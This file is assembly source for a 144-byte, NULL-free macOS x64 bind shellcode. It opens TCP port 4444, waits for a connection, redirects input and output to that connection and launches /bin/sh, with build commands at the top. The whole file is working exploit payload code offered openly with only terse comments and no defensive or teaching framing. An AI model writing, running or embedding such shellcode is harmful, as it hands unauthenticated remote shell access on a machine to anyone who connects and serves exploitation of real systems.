;OS X x64, TCP bind shellcode (port 4444), NULL byte free, 144 bytes long
;ASM code
;compile:
;nasm -f macho64 bind-shellcode.asm 
;ld -macosx_version_min 10.7.0 -o bindsc bind-shellcode.o

BITS 64

global start

section .text

;Argument order: rdi, rsi, rdx, rcx


start:
	;socket
	xor     rdi,rdi					;zero out RSI
	mov     dil, 0x2				;AF_INET = 2
	xor     rsi,rsi					;zero out RSI
	mov     sil, 0x1				;SOCK_STREAM = 1
	xor     rdx, rdx				;protocol = IP = 0
	
	;store syscall number on RAX
	xor     rax,rax					;zero out RAX
	mov     al,2					;put 2 to AL -> RAX = 0x0000000000000002
	ror     rax, 0x28				;rotate the 2 -> RAX = 0x0000000002000000
	mov     al,0x61					;move 3b to AL (execve socket#) -> RAX = 0x0000000002000061
	mov		r12, rax				;save RAX
    syscall							;trigger syscall
    
    ;bind
    mov		r9, rax					;save socket number
    mov 	rdi, rax				;put return value to RDI int socket
    xor		rsi, rsi				;zero out RSI
    push	rsi						;push RSI to the stack
    mov		esi, 0x5c110201			;port number 4444 (=0x115c)
    sub		esi,1					;make ESI=0x5c110200
    push	rsi						;push RSI to the stack
    mov 	rsi, rsp				;store address
    mov		dl,0x10					;length of socket structure 0x10
    add		r12b, 0x7				;RAX = 0x0000000002000068 bind
    mov		rax, r12				;restore RAX
    syscall
    
    ;listen
    ;RDI already contains the socket number
    xor		rsi, rsi				;zero out RSI
	inc		rsi						;backlog = 1
    add		r12b, 0x2				;RAX = 0x000000000200006a listen
    mov		rax, r12				;restore RAX
    syscall
    
    ;accept 30	AUE_ACCEPT	ALL	{ int accept(int s, caddr_t name, socklen_t	*anamelen); } 
    ;RDI already contains the socket number
    xor		rsi, rsi				;zero out RSI
	;RDX is already zero
    sub		r12b, 0x4c				;RAX = 0x000000000200001e accept
    mov		rax, r12				;restore RAX
    syscall
    
    ;int dup2(u_int from, u_int to); 
	mov		rdi, rax
	xor		rsi, rsi
	add		r12b, 0x3c				;RAX = 0x000000000200005a dup2
    mov		rax, r12				;restore RAX
    syscall
    
    inc		rsi
    mov 	rax, r12				;restore RAX
    syscall

	xor     rsi,rsi					;zero out RSI
	push    rsi						;push NULL on stack
	mov     rdi, 0x68732f6e69622f2f	;mov //bin/sh string to RDI (reverse)
	push    rdi						;push rdi to the stack
	mov     rdi, rsp				;store RSP (points to the command string) in RDI
	xor     rdx, rdx				;zero out RDX
	
	sub		r12b, 0x1f				;RAX = 0x000000000200003b execve
    mov		rax, r12				;restore RAX
    syscall							;trigger syscall
